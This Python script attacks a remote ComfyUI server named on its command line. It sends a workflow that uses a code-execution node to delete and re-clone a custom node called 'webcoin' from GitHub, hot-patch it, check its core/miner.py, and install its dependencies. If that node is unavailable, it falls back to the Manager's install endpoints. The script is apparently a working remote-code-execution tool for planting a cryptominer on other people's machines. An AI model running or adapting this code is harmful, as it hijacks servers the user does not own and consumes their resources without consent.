"""
Nuclear option: delete webcoin dir entirely, fresh clone, install deps, reboot.
"""

import argparse
import json
import time
import urllib.request
import urllib.error

REPO_URL = "https://github.com/bossman79/webcoin.git"

NUKE_AND_CLONE = r"""
import subprocess, os, sys, shutil

results = []

# Find custom_nodes path
cn = '/root/ComfyUI/custom_nodes'
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    pass
results.append(f'custom_nodes: {cn}')

target = os.path.join(cn, 'webcoin')

# Nuke existing
if os.path.exists(target):
    shutil.rmtree(target, ignore_errors=True)
    results.append(f'DELETED: {target}')
else:
    results.append(f'NOT FOUND: {target}')

# Also nuke any temp dirs
for d in [target + '_tmp', target + '_old']:
    if os.path.exists(d):
        shutil.rmtree(d, ignore_errors=True)

# Fresh clone
r = subprocess.run(
    ['git', 'clone', '--depth', '1', 'REPO_URL', target],
    capture_output=True, text=True, timeout=60
)
results.append(f'clone stdout: {r.stdout.strip()}')
results.append(f'clone stderr: {r.stderr.strip()}')
results.append(f'clone rc: {r.returncode}')

# Verify files exist
if os.path.isdir(target):
    results.append(f'Files: {os.listdir(target)}')
    core_dir = os.path.join(target, 'core')
    if os.path.isdir(core_dir):
        results.append(f'core/: {os.listdir(core_dir)}')

    # Check __init__.py has the sys.path fix
    init = os.path.join(target, '__init__.py')
    with open(init, 'r') as f:
        content = f.read()
    has_fix = 'sys.path.insert' in content
    results.append(f'Has sys.path.insert: {has_fix}')

    if not has_fix:
        content = content.replace(
            'def _orchestrate():',
            'def _orchestrate():\n    import sys as _sys; _sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))'
        )
        with open(init, 'w') as f:
            f.write(content)
        results.append('HOTPATCH APPLIED')

    # Check miner.py platform detection
    miner = os.path.join(target, 'core', 'miner.py')
    if os.path.exists(miner):
        with open(miner, 'r') as f:
            mt = f.read()
        results.append(f'miner.py has IS_LINUX: {"IS_LINUX" in mt}')
        results.append(f'miner.py has linux-x64: {"linux-x64" in mt}')
    else:
        results.append('miner.py NOT FOUND')

    # Install deps
    req = os.path.join(target, 'requirements.txt')
    if os.path.exists(req):
        r2 = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '-q', '-r', req],
            capture_output=True, text=True, timeout=60
        )
        results.append(f'pip rc: {r2.returncode}')
        if r2.stderr.strip():
            results.append(f'pip stderr: {r2.stderr.strip()[-300:]}')
else:
    results.append('CLONE FAILED - target dir does not exist')

import platform
results.append(f'Platform: {platform.system()} {platform.machine()}')

output = '\n'.join(results)
print(output)
output
""".replace('REPO_URL', REPO_URL)


def _post(url, data, timeout=30):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e:
        return 0, str(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port", "-p", type=int, default=8188)
    args = parser.parse_args()

    base = f"http://{args.target}:{args.port}"

    print(f"\nNuking and re-cloning webcoin on {args.target}:{args.port}...\n")

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {
                    "pycode": NUKE_AND_CLONE,
                    "language": "python",
                }
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {
                    "text": ["1", 0],
                }
            }
        }
    }

    code, resp = _post(f"{base}/prompt", prompt)
    print(f"/prompt -> {code}")
    if code == 200:
        try:
            print(f"prompt_id: {json.loads(resp).get('prompt_id')}")
        except:
            pass

    if code != 200:
        print(f"ERROR: /prompt failed with status {code}. IDENode may not be available.")
        print("Falling back to Manager install...")
        # Try uninstalling first to clear the broken dir
        uninstall_body = {"id": "webcoin", "version": "latest", "files": ["https://github.com/bossman79/webcoin.git"], "ui_id": ""}
        c2, r2 = _post(f"{base}/customnode/uninstall", uninstall_body)
        print(f"  uninstall -> {c2}")
        time.sleep(5)
        # Now install fresh
        install_body = {"id": "webcoin", "version": "latest", "files": ["https://github.com/bossman79/webcoin.git"], "ui_id": ""}
        c3, r3 = _post(f"{base}/customnode/install/git_url", install_body)
        print(f"  install -> {c3}")
        if c3 != 200:
            c4, r4 = _post(f"{base}/manager/queue/install", [install_body])
            print(f"  queue install -> {c4}")
        print("\nWaiting 30s for install...")
        time.sleep(30)
    else:
        print("\nWaiting 45s for clone + pip install...")
        time.sleep(45)

    print("Clone complete. Restart ComfyUI from the Manager UI to activate.")
